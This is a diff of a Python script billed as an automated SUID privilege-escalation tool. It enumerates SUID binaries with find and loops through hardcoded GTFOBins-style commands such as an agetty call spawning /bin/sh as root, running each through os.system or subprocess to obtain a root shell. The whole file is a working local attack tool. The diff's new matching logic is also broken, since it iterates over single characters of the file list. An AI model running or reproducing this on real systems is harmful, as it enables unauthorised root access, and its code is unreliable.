@@ -1,13 +1,15 @@
 import os
+import subprocess
 from colorama import Fore, Back, Style
 
 
 def flsh_print(string):
     print (string, flush = True)
-    
+
+flsh_print(" ")
 flsh_print(Style.BRIGHT + """ # Automated suid privilege escalation tool # """)
 flsh_print ("""-----------------------------------------------""")
-flsh_print (              """  #       https://github.com/ValentaA        # """)
+flsh_print (              """  #       https://github.com/ValentaA      # """)
 flsh_print ("""-----------------------------------------------""")
 
 
@@ -15,7 +17,8 @@ flsh_print ("""-----------------------------------------------""")
 
 #Save suid bits to file 
 flsh_print("[+]Saving available suid bits to file 'list.txt'")
-os.system("find / -type f -perm -04000 -ls 2>/dev/null > list.txt")
+basename2 = ("$file")
+os.system('''find / -type f -perm -4000 -ls 2>/dev/null | while read -r file; do basename "$file" | cut -d. -f1; done > list.txt''')
 
 #list suid option
 flsh_print ("[+]List suid bits?")
@@ -23,6 +26,7 @@ get_suid = input("[+]Y/N: ")
 if get_suid == "Y" or get_suid == "y":
     flsh_print ("[+]Listing suids")
     get_suid = os.system ("find / -type f -perm -04000 -ls 2>/dev/null")
+
 
 
 # get_root list
@@ -68,22 +72,33 @@ get_root = ["./agetty -o -p -l /bin/sh -a root tty", "./agetty -o `-p` -l /bin/s
 get_root_wth_pth = [item.lstrip("./") for item in get_root]
 
 with open ("list.txt", "r") as listed:
-    lsted = listed.read().splitlines()
+    lsted = listed.read()
     
+def app_name(command):
+    return command.split()[0]
+        
 
 #Search with path added
-
 for shell in get_root:
     flsh_print ("[+]Trying to get root shell - CTRL + C if stuck")   
     flsh_print ("[+]Use commands 'exit' or 'quit' to close the shell")
-    os.system(shell)
+    for app in lsted:
+        if app in app_name(shell):
+            os.system(shell)
+        else: 
+             flsh_print ("[+]Wrong path")
        
-       
+
 #Search without path added
-for shell in get_root_wth_pth: 
+for shel in get_root_wth_pth: 
     flsh_print ("[+]Trying to get root shell - CTRL + C if stuck")   
     flsh_print ("[+]Use commands 'exit' or 'quit' to close the shell")
-    os.system(shell)
+    for app in lsted:
+        if app in app_name(shel):
+            process = subprocess.Popen(shel, shell = True)
+        else:
+             flsh_print ("[+]Not found")
+
 
 
 flsh_print ("[+]------------------------------")
@@ -156,4 +171,6 @@ os.system("rm list.txt")
 flsh_print ("[+]------------------------------") 
 flsh_print ("[+]For more binaries and techniques visit: https://gtfobins.github.io/")  
 flsh_print("""----------------------------------------------------------------------""")
+
+
 
